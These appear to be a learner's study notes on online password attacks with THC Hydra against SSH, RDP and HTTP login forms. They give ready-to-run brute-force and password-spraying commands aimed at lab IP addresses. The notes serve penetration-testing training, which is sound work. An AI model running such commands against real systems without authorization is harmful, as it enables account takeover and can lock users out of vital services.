---
tags: hydra
---
> Note that dictionary attacks generate a lot of noise, including logs, events and traffic. The huge amount of traffic could bring down a network, or user accounts could get locked out in vital systems. Before blindly launching tools, we must perform thorough enumeration to identify and avoid these risks. 

## SSH and RDP

Tool: [THC Hydra](https://github.com/vanhauser-thc/thc-hydra)
Wordlist: rockyou.txt (located in `/usr/share/wordlists/`)

### Dictionary attack on SSH

Confirm that the target is running SSH service on the target port:
`sudo nmap -sV -p 2222 192.168.50.201`

Find username from information gathering process, or use built-in accounts like *root* (Linux) or *Administrator* (Windows).

Dictionary attack:
`sudo hydra -l george -P /usr/share/wordlists/rockyou/rockyou.txt -s 2222 ssh://192.168.50.201`
- `-l`: specify single username (`-L` to use list of usernames)
- `-P`: specify password list (`-p` to use single password)
- `-s`: specify port

### Password spraying on RDP

Wordlist of usernames (over 8000): `/usr/share/wordlists/dirb/others/names.txt`

Password spraying:
`sudo hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202`

Can try to use `-e nsr` option
- `-e nsr`: try "n" null password, "s" login as pass and/or "r" reversed login

## HTTP Post Login Form

Can use dictionary attack on known default usernames (e.g. found from the application's documentation).

1. Use Burp to intercept a login attempt and grab the request body in the POST data.
   ![[Pasted image 20240729150416.png|650]]
2. Identify a failed login attempt. Provide the text that appears as a failed login identifier to Hydra. 
3. `sudo hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"`
	- `http-post-form "[location of login form]:[request body]:[failed login identifier]"`
	- To avoid false positives, avoid including words like "username" and "password" in the failed login identifier.